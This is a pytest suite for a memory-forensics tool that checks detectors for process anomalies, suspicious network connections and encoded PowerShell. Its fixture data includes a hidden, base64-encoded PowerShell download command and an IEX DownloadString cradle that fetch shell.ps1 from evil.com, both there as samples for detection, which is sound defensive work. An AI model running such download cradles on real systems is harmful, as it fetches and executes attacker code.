"""
tests/test_tool_health.py
──────────────────────────────────────────────────────────────
End-to-end health checks for every GhostTrace component.
Run with:  pytest tests/test_tool_health.py -v

No real memory dump or API key required — all tests use the
mock fixture data bundled in tests/fixtures/.
"""

from __future__ import annotations

import json
import os
import pathlib
import pytest

# ── Fixtures path ───────────────────────────────────────────
FIXTURES = pathlib.Path(__file__).parent / "fixtures"

# ── Shared malicious sample data (mirrors the fixture files) ──

MALICIOUS_PSLIST = [
    # Normal Windows boot chain
    {"PID": "4",    "PPID": "0",    "Name": "System",        "Threads": "200", "CreateTime": "2024-01-01 08:00:00"},
    {"PID": "360",  "PPID": "4",    "Name": "smss.exe",      "Threads": "3",   "CreateTime": "2024-01-01 08:00:01"},
    {"PID": "480",  "PPID": "360",  "Name": "csrss.exe",     "Threads": "12",  "CreateTime": "2024-01-01 08:00:02"},
    {"PID": "520",  "PPID": "360",  "Name": "wininit.exe",   "Threads": "1",   "CreateTime": "2024-01-01 08:00:02"},
    {"PID": "572",  "PPID": "520",  "Name": "services.exe",  "Threads": "8",   "CreateTime": "2024-01-01 08:00:03"},
    {"PID": "600",  "PPID": "520",  "Name": "lsass.exe",     "Threads": "8",   "CreateTime": "2024-01-01 08:00:03"},
    {"PID": "800",  "PPID": "572",  "Name": "svchost.exe",   "Threads": "22",  "CreateTime": "2024-01-01 08:00:05"},
    {"PID": "1560", "PPID": "800",  "Name": "explorer.exe",  "Threads": "55",  "CreateTime": "2024-01-01 08:01:00"},
    # Malicious entries
    {"PID": "2048", "PPID": "1560", "Name": "winword.exe",   "Threads": "14",  "CreateTime": "2024-01-01 09:15:00"},
    {"PID": "3200", "PPID": "2048", "Name": "powershell.exe","Threads": "4",   "CreateTime": "2024-01-01 09:15:30"},  # winword→powershell
    {"PID": "4096", "PPID": "9999", "Name": "inject.exe",    "Threads": "2",   "CreateTime": "2024-01-01 09:16:00"},  # orphan (PPID 9999 missing)
    {"PID": "666",  "PPID": "520",  "Name": "lsass.exe",     "Threads": "1",   "CreateTime": "2024-01-01 09:16:05"},  # duplicate lsass
    {"PID": "777",  "PPID": "1",    "Name": "svch0st.exe",   "Threads": "2",   "CreateTime": "2024-01-01 09:17:00"},  # typosquat
]

MALICIOUS_MALFIND = [
    {"pid": "3200", "process": "powershell.exe", "address": "0x00400000", "protection": "PAGE_EXECUTE_READWRITE", "hex_preview": "4D 5A 90 00"},
    {"pid": "4096", "process": "inject.exe",     "address": "0x00500000", "protection": "PAGE_EXECUTE_READWRITE", "hex_preview": "FC 48 83 E4"},
    {"pid": "2048", "process": "winword.exe",    "address": "0x00600000", "protection": "PAGE_EXECUTE_READ",      "hex_preview": "4D 5A 00 00"},
]

MALICIOUS_NETSCAN = [
    {"Proto": "TCPv4", "LocalAddr": "192.168.1.101:49200", "ForeignAddr": "198.51.100.42:4444", "State": "ESTABLISHED", "PID": "3200", "Owner": "powershell.exe"},
    {"Proto": "TCPv4", "LocalAddr": "0.0.0.0:4444",        "ForeignAddr": "0.0.0.0:0",           "State": "LISTENING",   "PID": "4096", "Owner": "inject.exe"},
]

ENCODED_PS_CMDLINES = [
    {"process": "powershell.exe", "pid": "3200",
     "cmdline": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "
                "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQA"
                "LgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkA"
                "bABlACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwA"
                "bAAuAHAAcwAxACcALAAnAEMAOgBcAHQAZQBtAHAAXABzAGgAZQBsAGwALgBwAHMA"
                "MQAnACkAOwA="},
]


# ═══════════════════════════════════════════════════════════════
# 1. ACQUISITION — dump integrity & info
# ═══════════════════════════════════════════════════════════════

class TestAcquisition:
    """Tests for tools/acquisition.py"""

    def test_verify_nonexistent_dump_returns_error(self):
        from tools.acquisition import verify_dump_integrity
        result = verify_dump_integrity("/nonexistent/path/dump.mem")
        assert result["status"] == "error"
        assert "not found" in result["message"].lower()

    def test_verify_real_file_computes_hash(self, tmp_path):
        from tools.acquisition import verify_dump_integrity
        dump = tmp_path / "test.mem"
        dump.write_bytes(b"\x00" * 1024)
        result = verify_dump_integrity(str(dump))
        assert "sha256" in result
        assert len(result["sha256"]) == 64          # SHA-256 hex string
        assert result["integrity_verified"] == "not_checked"

    def test_verify_hash_match(self, tmp_path):
        import hashlib
        from tools.acquisition import verify_dump_integrity
        data = b"MEMORY_DUMP_DATA"
        dump = tmp_path / "test.dmp"
        dump.write_bytes(data)
        expected = hashlib.sha256(data).hexdigest()
        result = verify_dump_integrity(str(dump), expected_hash=expected)
        assert result["integrity_verified"] is True

    def test_verify_hash_mismatch(self, tmp_path):
        from tools.acquisition import verify_dump_integrity
        dump = tmp_path / "test.dmp"
        dump.write_bytes(b"DATA")
        result = verify_dump_integrity(str(dump), expected_hash="deadbeef" * 8)
        assert result["integrity_verified"] is False

    def test_get_dump_info_returns_metadata(self, tmp_path):
        from tools.acquisition import get_dump_info
        dump = tmp_path / "win10_memdump.mem"
        dump.write_bytes(b"\x00" * 512)
        result = get_dump_info(str(dump))
        assert result["filename"] == "win10_memdump.mem"
        assert result["size_bytes"] == 512
        assert "profile_hint" in result

    def test_list_available_dumps(self, tmp_path):
        from tools.acquisition import list_available_dumps
        (tmp_path / "a.mem").write_bytes(b"x")
        (tmp_path / "b.raw").write_bytes(b"x")
        (tmp_path / "c.txt").write_bytes(b"x")    # should NOT be listed
        result = list_available_dumps(str(tmp_path))
        assert result["count"] == 2
        names = [d["name"] for d in result["dumps"]]
        assert "c.txt" not in names


# ═══════════════════════════════════════════════════════════════
# 2. PROCESS INSPECTOR — anomaly detection
# ═══════════════════════════════════════════════════════════════

class TestProcessInspector:
    """Tests for tools/process_inspector.py — uses MALICIOUS_PSLIST above."""

    def _run(self, pslist=None):
        from tools.process_inspector import detect_process_anomalies
        return detect_process_anomalies(pslist or MALICIOUS_PSLIST)

    def test_detects_orphan_process(self):
        """inject.exe has PPID 9999 which doesn't exist → orphan."""
        result = self._run()
        orphans = [r for r in result if r["category"] == "orphan_process"]
        orphan_pids = [r["pid"] for r in orphans]
        assert "4096" in orphan_pids, "inject.exe (PID 4096) should be an orphan"

    def test_detects_duplicate_lsass(self):
        """Two instances of lsass.exe → CRITICAL duplicate."""
        result = self._run()
        dups = [r for r in result if r["category"] == "duplicate_system_process"]
        dup_names = [r["process"] for r in dups]
        assert "lsass.exe" in dup_names
        assert dups[0]["severity"] == "CRITICAL"

    def test_detects_winword_spawning_powershell(self):
        """winword.exe → powershell.exe is a classic macro attack."""
        result = self._run()
        shell_spawns = [r for r in result if r["category"] == "suspicious_shell_spawn"]
        assert len(shell_spawns) >= 1
        parents = [r["parent"] for r in shell_spawns]
        assert "winword.exe" in parents

    def test_detects_typosquat_svchost(self):
        """svch0st.exe is a typosquat of svchost.exe."""
        result = self._run()
        spoofing = [r for r in result if r["category"] == "name_spoofing"]
        targets = [r["spoofed_target"] for r in spoofing]
        assert "svchost.exe" in targets

    def test_clean_process_list_produces_no_critical_anomalies(self):
        clean = [
            {"PID": "4",   "PPID": "0",  "Name": "System"},
            {"PID": "360", "PPID": "4",  "Name": "smss.exe"},
            {"PID": "480", "PPID": "360","Name": "csrss.exe"},
        ]
        result = self._run(clean)
        criticals = [r for r in result if r["severity"] == "CRITICAL"]
        assert len(criticals) == 0


# ═══════════════════════════════════════════════════════════════
# 3. NETWORK INSPECTOR — C2 & suspicious connections
# ═══════════════════════════════════════════════════════════════

class TestNetworkInspector:
    """Tests for tools/network_inspector.py"""

    def test_detects_port_4444(self):
        from tools.network_inspector import detect_suspicious_connections
        result = detect_suspicious_connections(MALICIOUS_NETSCAN)
        ports = [r for r in result if r.get("category") == "suspicious_port"]
        assert len(ports) >= 1, "Port 4444 (Metasploit) should be flagged"

    def test_detects_process_on_network(self):
        """inject.exe listening on 4444 should be flagged."""
        from tools.network_inspector import detect_suspicious_connections
        result = detect_suspicious_connections(MALICIOUS_NETSCAN)
        process_names = [r.get("process", "").lower() for r in result]
        assert any("inject" in p for p in process_names)

    def test_clean_connections_produce_no_alerts(self):
        from tools.network_inspector import detect_suspicious_connections
        clean = [
            {"Proto": "TCPv4", "LocalAddr": "192.168.1.1:80",  "ForeignAddr": "10.0.0.1:50000",
             "State": "ESTABLISHED", "PID": "800", "Owner": "svchost.exe"},
        ]
        # Should not raise; result may be empty or only low-severity
        result = detect_suspicious_connections(clean)
        criticals = [r for r in result if r.get("severity") == "CRITICAL"]
        assert len(criticals) == 0


# ═══════════════════════════════════════════════════════════════
# 4. POWERSHELL DECODER — base64 & pattern detection
# ═══════════════════════════════════════════════════════════════

class TestPowerShellDecoder:
    """Tests for tools/powershell_decoder.py"""

    def test_detects_encoded_command_flag(self):
        from tools.powershell_decoder import decode_powershell_commands
        result = decode_powershell_commands(ENCODED_PS_CMDLINES)
        assert len(result) >= 1
        patterns = [p["name"] for r in result for p in r.get("patterns_found", [])]
        assert "EncodedCommand" in patterns

    def test_decodes_base64_payload(self):
        from tools.powershell_decoder import decode_powershell_commands
        result = decode_powershell_commands(ENCODED_PS_CMDLINES)
        decoded_texts = [r.get("decoded_content", "") for r in result]
        # Decoded payload contains a URL download cradle
        assert any("http" in t.lower() or "downloadfile" in t.lower() for t in decoded_texts)

    def test_extract_iocs_finds_urls(self):
        from tools.powershell_decoder import extract_iocs
        text = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
        result = extract_iocs(text)
        urls = result.get("urls", [])
        assert any("evil.com" in u for u in urls)

    def test_benign_cmdline_produces_no_critical_pattern(self):
        from tools.powershell_decoder import decode_powershell_commands
        benign = [{"process": "powershell.exe", "pid": "100",
                   "cmdline": "powershell.exe -Command Get-Process"}]
        result = decode_powershell_commands(benign)
        for r in result:
            criticals = [p for p in r.get("patterns_found", []) if p["severity"] == "CRITICAL"]
            assert len(criticals) == 0


# ═══════════════════════════════════════════════════════════════
# 5. THREAT SCORER — scoring model
# ═══════════════════════════════════════════════════════════════

class TestThreatScorer:
    """Tests for tools/threat_scorer.py"""

    def test_empty_input_scores_low(self):
        from tools.threat_scorer import score_threats
        result = score_threats()
        assert result["score"] == 0
        assert result["level"] == "LOW"

    def test_full_attack_scores_critical(self):
        from tools.threat_scorer import score_threats
        from tools.process_inspector import detect_process_anomalies
        from tools.network_inspector import detect_suspicious_connections
        proc_anomalies = detect_process_anomalies(MALICIOUS_PSLIST)
        net_anomalies  = detect_suspicious_connections(MALICIOUS_NETSCAN)
        result = score_threats(
            malfind_data=MALICIOUS_MALFIND,
            process_anomalies=proc_anomalies,
            network_anomalies=net_anomalies,
        )
        assert result["score"] >= 50, "Heavy attack evidence should score ≥50"
        assert result["level"] in ("MEDIUM", "HIGH", "CRITICAL")

    def test_score_thresholds(self):
        from tools.threat_scorer import _classify
        assert _classify(0)   == "LOW"
        assert _classify(30)  == "LOW"
        assert _classify(31)  == "MEDIUM"
        assert _classify(65)  == "MEDIUM"
        assert _classify(66)  == "HIGH"
        assert _classify(90)  == "CRITICAL"

    def test_breakdown_keys_always_present(self):
        from tools.threat_scorer import score_threats
        result = score_threats()
        expected = {"malfind_injections", "encoded_powershell", "process_anomalies",
                    "network_anomalies", "dll_anomalies", "handle_anomalies", "lolbas_execution"}
        assert set(result["breakdown"].keys()) == expected

    def test_recommendations_always_present(self):
        from tools.threat_scorer import score_threats
        result = score_threats()
        assert isinstance(result["recommendations"], list)
        assert len(result["recommendations"]) >= 1


# ═══════════════════════════════════════════════════════════════
# 6. TIMELINE BUILDER
# ═══════════════════════════════════════════════════════════════

class TestTimelineBuilder:
    """Tests for tools/timeline_builder.py"""

    def test_builds_timeline_from_pslist_and_net(self):
        from tools.timeline_builder import build_attack_timeline
        result = build_attack_timeline(
            pslist_data=MALICIOUS_PSLIST,
            netscan_data=MALICIOUS_NETSCAN,
        )
        assert isinstance(result, dict)
        assert "events" in result or "timeline" in result or "steps" in result or len(result) > 0

    def test_timeline_is_non_empty_on_malicious_data(self):
        from tools.timeline_builder import build_attack_timeline
        result = build_attack_timeline(pslist_data=MALICIOUS_PSLIST)
        # Result must have at least one key with content
        assert any(result.values())


# ═══════════════════════════════════════════════════════════════
# 7. VOLATILITY RUNNER — mock mode
# ═══════════════════════════════════════════════════════════════

class TestVolatilityRunnerMockMode:
    """Tests for tools/volatility_runner.py in --mock mode."""

    @pytest.fixture(autouse=True)
    def enable_mock(self):
        os.environ["MEMFORENSIC_MOCK"] = "1"
        yield
        os.environ.pop("MEMFORENSIC_MOCK", None)

    def test_pslist_returns_list(self):
        from tools.volatility_runner import run_pslist
        result = run_pslist("fake.mem")
        assert isinstance(result, list)
        assert len(result) > 0

    def test_malfind_returns_list(self):
        from tools.volatility_runner import run_malfind
        result = run_malfind("fake.mem")
        assert isinstance(result, list)

    def test_netscan_returns_list(self):
        from tools.volatility_runner import run_netscan
        result = run_netscan("fake.mem")
        assert isinstance(result, list)

    def test_cmdline_returns_list(self):
        from tools.volatility_runner import run_cmdline
        result = run_cmdline("fake.mem")
        assert isinstance(result, list)

    def test_mock_pslist_has_expected_fields(self):
        from tools.volatility_runner import run_pslist
        result = run_pslist("fake.mem")
        # Each entry should have at minimum a name/PID-like field
        first = result[0]
        has_name = any(k.lower() in ("name", "imagefilename", "process") for k in first)
        assert has_name, f"pslist entry missing name field: {first}"


# ═══════════════════════════════════════════════════════════════
# 8. INTEGRATION — full pipeline (mock mode, no LLM call)
# ═══════════════════════════════════════════════════════════════

class TestIntegrationPipeline:
    """
    Wires up the full forensic pipeline without an LLM or real dump.
    Processes → Anomaly Detection → Threat Score → Timeline
    """

    def test_full_pipeline_end_to_end(self):
        from tools.process_inspector import detect_process_anomalies
        from tools.network_inspector import detect_suspicious_connections
        from tools.powershell_decoder import decode_powershell_commands, extract_iocs
        from tools.threat_scorer import score_threats
        from tools.timeline_builder import build_attack_timeline

        # Step 1 — process analysis
        proc_anomalies = detect_process_anomalies(MALICIOUS_PSLIST)
        assert len(proc_anomalies) >= 3, "Should detect orphan + duplicate + shell spawn"

        # Step 2 — network analysis
        net_anomalies = detect_suspicious_connections(MALICIOUS_NETSCAN)
        assert len(net_anomalies) >= 1

        # Step 3 — PowerShell decode
        ps_results = decode_powershell_commands(ENCODED_PS_CMDLINES)
        assert len(ps_results) >= 1
        iocs = extract_iocs(ps_results[0].get("decoded_content", ""))

        # Step 4 — threat score
        score = score_threats(
            malfind_data=MALICIOUS_MALFIND,
            process_anomalies=proc_anomalies,
            network_anomalies=net_anomalies,
            powershell_findings=ps_results,
        )
        assert score["score"] > 0
        assert score["level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL")

        # Step 5 — timeline
        timeline = build_attack_timeline(
            pslist_data=MALICIOUS_PSLIST,
            netscan_data=MALICIOUS_NETSCAN,
            process_anomalies=proc_anomalies,
        )
        assert timeline is not None

        print(f"\n✅ Pipeline complete — threat score: {score['score']} ({score['level']})")
        print(f"   Anomalies: {len(proc_anomalies)} process, {len(net_anomalies)} network")
        print(f"   IOCs found: {iocs}")


# ═══════════════════════════════════════════════════════════════
# 9. FIXTURE FILES — sanity checks
# ═══════════════════════════════════════════════════════════════

class TestFixtures:
    """Verify fixture JSON files load correctly."""

    @pytest.mark.parametrize("filename", [
        "sample_pslist.json",
        "sample_malfind.json",
        "sample_netscan.json",
        "sample_cmdline.json",
    ])
    def test_fixture_is_valid_json_list(self, filename):
        fixture = FIXTURES / filename
        assert fixture.exists(), f"Missing fixture: {filename}"
        data = json.loads(fixture.read_text())
        assert isinstance(data, list)
        assert len(data) > 0
